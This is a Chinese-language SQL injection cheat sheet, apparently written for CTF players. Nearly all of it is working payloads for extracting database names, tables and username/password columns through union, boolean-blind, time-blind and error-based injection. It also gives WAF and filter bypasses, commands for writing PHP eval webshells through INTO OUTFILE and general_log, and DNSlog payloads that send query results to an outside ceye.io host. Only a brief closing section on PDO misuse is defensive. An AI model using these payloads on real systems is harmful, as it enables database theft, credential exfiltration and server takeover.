常规
http://www.xxx.cn/list.php?id=x' and 1=1 and ‘1’=’1    确定闭合方式
http://www.xxx.cn/list.php?id=524 order by 5     确定字段数
http://www.xxx.cn/list.php?id=x' and 1=2 union select 1,2,3,4# 寻找可显示字段
http://www.xxx.cn/list.php?id=x' and 1=2 union select 1,2,database(),4 #    爆数据库名
http://www.xxx.cn/list.php?id=-1' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=’数据库名’#            爆表名
http://www.xxx.cn/list.php?id=-1' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=’表名’ #                爆列名
http://www.xxx.cn/list.php?id=x’ union select 1,group_concat(username,password),3,4 from 表名         爆表中数据


布尔盲注
id=1' and length(database())=1# 猜数据库名长度
id=1' and ascii(substr(database()),1,1)>97#      猜数据库名
id=x' and (select count(table_name) from information_schema.tables where table_schema=database())=2# 猜表的数量
id=1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1#  猜第一个表的表名长度
id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97#   猜第一个表的表名
id=1' and (select count(column_name) from information_schema.columns where table_name='users')=2# 猜表中字段数量
id=1' and length(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1))=1#   猜第一个字段长度
id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))>97#  猜第一个字段名
id=1' and ascii(substr((select password from user limit 0,1),1,1))>1#
之后才数据同上


时间盲注
id=1' and sleep(5)#     测试
id=1' and if(length(database())=1,sleep(5),1)#  猜数据库长度
id=1' and if(ascii(substr(database(),1,1))>97,sleep(5),1)# 猜数据库名
id=1' and if((select count(table_name) from information_schema.tables where table_schema=database())=1,
sleep(5),1)#  猜表的数量
id=1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1)# 猜表的长度
id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97,sleep(5),1)# 猜第一个表的名字


1.倘若空格过滤了
/**/    Tab  %a0   使用括号
(对/**/这个，有时候黑盒情况下可能会过滤/**/,试一下/*11*/)
另外：
%09
%0A
%0D
+
/|–|/
/@–|/
/?–|/
/|%20–%20|/
都可以替代空格。

还有反引号`绕过
select`version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用


2.什么是堆叠查询（stacked query）？
在单个数据库连接中，执行多个查询序列，是否允许堆叠查询是影响能否利用SQL注入漏洞的重要因素之一。在MYSQL中，SELECT * FROM members; DROP members；是可以执行的，数据库是肯定支持堆叠查询的，但是让php来执行堆叠查询的sql语句就不一定行了。


3.如果注入语句中的‘=’被过滤？
可以考虑使用like关键字替换：union select password from users where username like admin；
或者使用 < 或 >


4.引号绕过
如果单引号'或者双引号"被addslashes()函数转义，以下两种情况：
1.该注入是字符型注入，需要用单引号或者双引号来闭合语句,当后台数据库设置为gbk编码时会认为两个字符为一个汉字，存在宽字节注入
如  id=-1%df%27union select 1,user(),3--+    具体详见下面的宽字节注入
2.该注入不要要用单双引号来闭合语句，只是用来包围表名，这时可以将表名转换为16进制，即可不需要用引号
如106.14.114.127:21013/content.php?title_id=-1 union select 1,2,table_name,4 from information_schema.tables where table_schema='flag' limit1,1 
即可变为  .....where table_schema=0x666c6167 limit1,1看后台编码   16进制
3.如果后台代码又进行了一次base64或者url等方式的解码，那么在传数据之前先进行一次编码，就可以绕过，这是设计的失误，实际上导致后台的过滤形同虚设



5.宽字节注入     %bf%27    %df%27    %aa%27
宽字节注入：过滤 ' 的时候往往利用的思路是将 ' 转换为 \' 。
在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：
（1）%df 吃掉 \ 具体的方法是 urlencode('\) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（'）符号在外面：
id=-1%df%27union select 1,user(),3--+
（2）将 \' 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。
一般产生宽字节注入的PHP函数：
1.replace（）：过滤 ' \ ，将 ' 转化为 \' ，将 \  转为 \\，将 " 转为 \" 。用思路一。
2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：' , " , \ 。用思路一（防御此漏洞，要将 mysql_query 设置为 binary 的方式）
3.mysql_real_escape_string()：转义下列字符：\x00     \n     \r     \   '    "     \x1a

宽字节注入也是导致预编译无法防御sql注入的一个原因



6.逗号绕过（使用from或者offset）
在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：
select substr(database() from 1 for 1); select mid(database() from 1 for 1);
对于limit可以使用offset来绕过：
select * from news limit 0,1# 等价于下面这条SQL语句  select * from news limit 1 offset 0

select 1,2,3 等价于 select (select 1)a join (select 2)b join (select 3)c


7.没有逗号且没有空格
使用：  ascii(mid(REVERSE(MID((passwd)from(-%d)))from(-1)))=%d
原理：
假设：
passwd=abc123
那么我们用以下方式倒序输出from的位数
mid((passwd)from(-1)):       3
mid((passwd)from(-2)):       23
mid((passwd)from(-3)):       123
倒着看的第一位都是3，显然不行，无法截取出来，于是想到先反转然后取最后一位即可
故构造为：
先反转
REVERSE(MID((passwd)from(-%d))
再取最后一位
mid(REVERSE(MID((passwd)from(-%d)))from(-1))
再比较ascii码值
ascii(mid(REVERSE(MID((passwd)from(-%d)))from(-1)))=%d


8.比较符号（<>）绕过（使用greatest()：
同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。
如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。
最常见的一个盲注的sql语句：select * from users where id=1 and ascii(substr(database(),0,1))>64
此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。
greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值。
那么上面的这条sql语句可以使用greatest变为如下的子句:
select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64


9.or and 绕过：
and=&&  or=||
还可以使用 加号+ 减号-，比如 id=1正常回显，那么id=2-1，减号后面的1即为自己构造的等于1的语句，这可用于布尔盲注
id=-sleep(1)可用于时间盲注，但是这时候真正sleep的时间可能要多于1s
mysql和php一样都是弱类型比较，例如  '12a'-12=0,  'a'-0=0,所以
当or and 空格都被禁用时，构造uname=admin'-'0 由于后台sql语句为
$sql = select * from users where username=$username;
在字符串username的值和数字0比较的时候，字符串变为了0，故此0=0



10.if绕过
正常：if(1=1,sleep(5),1)
方式1：
id =1 and 1 and sleep(5);    and的逻辑问题，当and连接两个判断，若前一个判断为假，and不会执行后面的
方式2：
select case when 1=1 then sleep(1) else 0 end




11.绕过union，select，where，sleep，substr等关键字：
（1）使用注释符绕过：常用注释符：//，-- , /**/, #, --+, -- -, ;,%00,--a
用法：U/**/NION/**/SE/**/LECT/**/user，pwdfromuser
（2）使用大小写绕过：id=-1'UnIoN/**/SeLeCT
（3）内联注释绕过：id=-1'/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#
（4） 双关键字绕过：id=-1'UNIunionONSeLselectECT1,2,3–-
（5）截断绕过
%00,%0A,?,/0,////////////////........////////,%80-%99
（6)等价函数与命令
有些函数或命令因其关键字被检测出来而无法使用，但是在很多情况下可以使用与之等价或类似的代码替代其使用
hex()、bin() ==> ascii()
sleep() ==>benchmark()
concat_ws()==>group_concat()
mid()、substr() ==> substring()
 (7)使用char绕过
 在强网杯线上赛的随便注题目中，select和.都被过滤，导致无法查询，也没法查询列、字段，采用的方法是使用char，将整个查询语句变成如char(112)
 这种形式，使用concat连接，具体exp写法见writeup




12.编码绕过
如URLEncode编码，ASCII,HEX,unicode编码绕过
因为php的后台的弱类型处理，会自动将上述编码的字符串进行处理，如  0x616263=='abc' 为true
除此之外，还有其他编码表示括号等特殊符号：
空白：
%u0020%uff00
%c0%20%c0%a0%e0%80%a0
左括号(:
%u0028%uff08
%c0%28%c0%a8%e0%80%a8
右括号):
%u0029%uff09
%c0%29%c0%a9%e0%80%a9


13.当过滤or等关键词，导致information相关的表不能用，无法指定字段，假设题目已经给表名，或者其他情况下无法使用字段，可以以如下方式填充字段：
正常准备要使用的查询语句为
id=-1 union 1,flag,3,4 from user#
将可回显位置改为：
select i.4 from (select 1,2,3,4 union select * from user)i limit 1,1
这种方式是把字段名都用 i.1 i.2 i.3 i.4替代
结合起来即为
id=-1 union 1,(select i.4 from (select 1,2,3,4 union select * from user)i limit 1,1),3,4 from user#



14.报错注入的生僻函数
	geometrycollection()
	multipoint()
	polygon()
	multipolygon()
	linestring()
	multilinestring()
	exp()
	ST_LatFromGeoHash()
	ST_LongFromGeoHash()
	GTID_SUBSET()
	GTID_SUBTRACT()
	ST_PointFromGeoHash()

	1、通过floor报错,注入语句如下:
	and select 1 from (select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a);

	2、通过ExtractValue报错,注入语句如下:
	and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));

	3、通过UpdateXml报错,注入语句如下:
	and 1=(updatexml(1,concat(0x3a,(select user())),1))

	4、通过NAME_CONST报错,注入语句如下:
	and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)

	5、通过join报错,注入语句如下:
	select * from(select * from mysql.user ajoin mysql.user b)c;

	6、通过exp报错,注入语句如下:
	and exp(~(select * from (select user () ) a) );

	7、通过GeometryCollection()报错,注入语句如下:
	and GeometryCollection(()select *from(select user () )a)b );

	8、通过polygon ()报错,注入语句如下:
	and polygon (()select * from(select user ())a)b );

	9、通过multipoint ()报错,注入语句如下:
	and multipoint (()select * from(select user() )a)b );

	10、通过multlinestring ()报错,注入语句如下:
	and multlinestring (()select * from(selectuser () )a)b );

	11、通过multpolygon ()报错,注入语句如下:
	and multpolygon (()select * from(selectuser () )a)b );

	12、通过linestring ()报错,注入语句如下:
	and linestring (()select * from(select user() )a)b );

	13、通过ST_LatFromGeoHash()报错,注入语句如下:
	select * from users where id=1 or ST_LatFromGeoHash(concat(0x7e,(select database()),0x7e))

	14、通过ST_LongFromGeoHash ()报错,注入语句如下:
	select * from users where id=1 or ST_LongFromGeoHash(concat(0x7e,(select database()),0x7e))

	15、通过ST_PointFromGeoHash ()报错,注入语句如下:
	select * from users where id=1 or ST_PointFromGeoHash(concat(0x7e,(select database()),0x7e),1)

	16、通过TID_SUBSET ()报错,注入语句如下:
	select * from users where id=1 or GTID_SUBSET(concat(0x7e,(select database()),0x7e),1)

	17、通过GTID_SUBTRACT ()报错,注入语句如下:
	select * from users where id=1 or GTID_SUBTRACT(concat(0x7e,(select database()),0x7e),1)

	18、通过updatexml ()报错,注入语句如下:
	select * from users where id=1 or updatexml(1,concat(0x7e,database(),0x7e),1)
		updatexml报错注入:
		爆数据库版本信息：?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
		链接用户：?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)
		链接数据库：?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
		爆库：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)
		爆表：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)
		爆字段：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)
		爆字段内容：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)





15.时间盲注
常见注入形式：
select * from article where id = 1 and if(布尔表达式,sleep(1),1);
select * from article where id = 1 and 0 and sleep(1);

进阶姿势1— elt()
select * from article where id = 1 and elt(布尔表达式+1,1,sleep(1));
elt(N ,str1 ,str2 ,str3 ,…)
函数使用说明：若 N = 1 ，则返回值为 str1 ，若 N = 2 ，则返回值为 str2 ，以此类推。 若 N 小于 1 或大于参数的数目，则返回值为 NULL 。

进阶姿势2—field()
select * from article where id = 1 and field(1,sleep(1));
filed(str, str1, str2, str3, ……)
该函数返回的是 str 在面这些字符串的位置的索引，如果找不到返回 0 

进阶姿势3—get_lock()
正常情况下我们与mysql建立连接使用的时mysql_connect()，但是到题目使用mysql_pconnect()时即存在问题，
两函数区别如下：
mysql_connect() 脚本一结束，到服务器的连接就被关闭
mysql_pconnect（） 打开一个到mysql服务器的持久连接
mysql命令行下,select get_lock('a',1);  对资源a加锁
另开一个命令行，select get_lock('a',3)  延时3s
利用时，需要先访问一次，使用get_lock加锁资源，然后一到两分钟后（使服务器认为为两个用户，效果等价于开两个mysql命令行），再次进行时间盲注


进阶姿势4—Heavy Query  （场景：题目没有回显只能使用时间盲注并且没法使用sleep相关的关键字）
即用到一些消耗资源的方式让数据库的查询时间尽量变长
而消耗数据库资源的最有效的方式就是让两个大表做笛卡尔积，这样就可以让数据库的查询慢下来
而最后找到系统表information_schema数据量比较大，可以满足要求，所以我们让他们做笛卡尔积。

共有289个tables，3134个columns
我们让3个3134做笛卡尔积运算

3列的运算
select * from content where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C);

2列1库的情况
select * from content where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);

故此，在无延时函数的情况下，可以使用heavy query



基于约束的sql注入：
某题目要求以admin身份登录，但是admin已经被注册，且不知道密码。
可以尝试注册一个用户为 'admin 很多空格 1'  该用户名在后台判断用户名是否已经存在时是可以通过的，但是在数据库如果限制了插入的字符串的长度，
那么超过限制长度的部分就会被忽略掉，那么就会被认为是admin
除了空格，还有一种情况，后台会对我输入的字符进行转义，加\，导致我没办法使用单双引号无法逃逸进行闭合等操作，但是在这种情况下，如果后台还是存在长度的限制，对我的输入进行了截断，那么我输入若干个\，当被截断的时候，如果是偶数，那么每两个\成一对，那么后面的单双引号成功逃逸




MySQL写webshell的几种方式及其利用条件：
union select 后写入              root权限
lines terminated by 写入         GPC关闭（能使用单引号），magic_quotes_gpc=On
lines starting by 写入           有绝对路径（读文件可以不用，写文件必须）
fields terminated by 写入        没有配置-secure-file-priv
COLUMNS terminated by 写入       成功条件：有读写权限，有create、insert、select的权限


sql注入无回西安的情况下，利用dnslog构造代码的方式：

mysql中利用load_file()构造payload：
' and if((select load_file(concat('\\\',(select database()),'.xxx.ceye.io\\abc'))),1,0)#
mssql中利用master..xp_dirtree构造payload：
DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+’.xxx.ceye.io’;EXEC(‘master..xp_dirtree”\’+@host+’\foobar$”‘);



phpmyadmin 写shell的方式：
一、常规导入shell的操作：
常见数据表导出shell
CREATE TABLE `mysql`.`shadow9 (`content` TEXT NOT NULL );
INSERT INTO `mysql`.`shadow9` (`content` ) VALUES ('<?php @eval($_POST[pass]);?>'');
SELECT `content` FROM `shadow9` INTO OUTFILE 'C:\\phpStudy\\WWW\\90sec.php';
DROP TABLE IF EXISTS `shadow9`;

二、一句话导出shell：
select '<?php @eval($_POST[pass]);?>' into outfile 'c:/phpstudy/www/90sec.php';  
select '<?php @eval($_POST[pass]);?>' into outfile 'c:\\phpstudy\\www\\90sec.php';
select '<?php @eval($_POST[pass]);?>' into dumpfile 'c:\\phpstudy\\www\\bypass.php';

三、日志备份文件获取shell
show global variables like "%genera%";          //查询general_log配置
set global general_log='on';              //开启general log模式
SET global general_log_file='D:/phpStudy/WWW/cmd.php';    //设置日志文件保存路径
SELECT '<?php phpinfo();?>';              //phpinfo()写入日志文件
set global general_log='off';              //关闭general_log模式





预编译不能100%防sql注入，如：

一、

$pdo->query('SET NAMES gbk');
$var = "\xbf\x27 OR 1=1 /*";
$query = 'SELECT * FROM test WHERE name = ? LIMIT 1';
$stmt = $pdo->prepare($query);
$stmt->execute(array($var));

类似于宽字节注入

二、

$dbh = new PDO("txf");
$name = $_GET['name'];
$stmt = $dbh->prepare('SELECT * FROM ' . $name . ' where username = :username');
$stmt->execute( array(':username' => $_REQUEST['username']) );

参数name是一串数组，PDO不会生效

正确写法:
$dbh = new PDO("blahblah");

$tableToUse = $_GET['userTable'];
$allowedTables = array('users','admins','moderators');
if (!in_array($tableToUse,$allowedTables))    
 $tableToUse = 'users';

$stmt = $dbh->prepare('SELECT * FROM ' . $tableToUse . ' where username = :username');
$stmt->execute( array(':username' => $_REQUEST['username']) );


三、

$stmt = $dbh->prepare('SELECT * FROM foo ORDER BY :userSuppliedData');

PDO对DDL（数据定义语言）不生效